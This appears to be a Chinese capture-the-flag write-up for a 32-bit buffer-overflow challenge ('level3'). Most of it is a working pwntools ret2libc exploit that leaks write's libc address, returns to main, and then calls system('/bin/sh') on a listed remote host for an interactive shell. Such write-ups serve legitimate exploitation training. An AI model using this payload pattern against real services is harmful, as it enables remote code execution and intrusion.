+ 这道题首先要通过 `read` 来泄露`write` 的 `libc` 偏移（因为服务器肯定开启了 `ASLR` ），得到 `write` 的偏移之后再重新回到 `main` 函数，再执行一次，这样就可以在泄露了 `libc` 的地址之后再跳到 `system` 。

+ 为什么这道题我构造第一个 `payload` 的时候将 `write` 的 `got` 表作为第一个返回地址不行，而将其 `plt` 表作为第一个返回地址就可以？ `write` 已经执行过一次其 `got` 表不是已经放了其偏移地址吗？

+ 这道题巧妙的地方在于先通过 `write` 泄露 `libc` 然后再跳转到  `main` 函数重新执行一遍，在上一次执行得到 `libc` 的偏移之后，这一次就可以跳到 `system` 来 `getshell` 。

  ```python3
  #!/usr/python3
  #coding:utf-8
  
  from pwn import *
  
  io = connect("220.249.52.133", 59531)
  
  libc = ELF("./libc_32.so.6")
  
  elf = ELF("./level3")
  
  # 因为write已经执行过一次，所以其got表里面存放的是其libc的地址
  write_got = elf.got["write"]
  
  # write的plt
  write_plt_addr = elf.plt["write"]
  
  # 泄露libc之后回到main再执行一次
  main_addr = elf.symbols["main"]
  
  # 参数从右往左入栈
  payload = flat([cyclic(140), write_plt_addr, main_addr, 1, write_got, 4])
  
  io.sendlineafter("nput:\n", payload)
  
  write_addr = u32(io.recv(4))
  
  success("write_addr = 0x%x\n", write_addr)
  
  # 获取libc偏移
  libc_offset = write_addr - libc.symbols["write"]
  
  # 得到system在libc中的地址
  system_addr = libc_offset + libc.symbols["system"]
  
  # 构造第二个payload
  payload = flat([cyclic(140), system_addr, b'AAAA', next(libc.search(b"/bin/sh")) + libc_offset])
  
  io.sendlineafter("nput:\n", payload)
  
  io.interactive()
  ```

  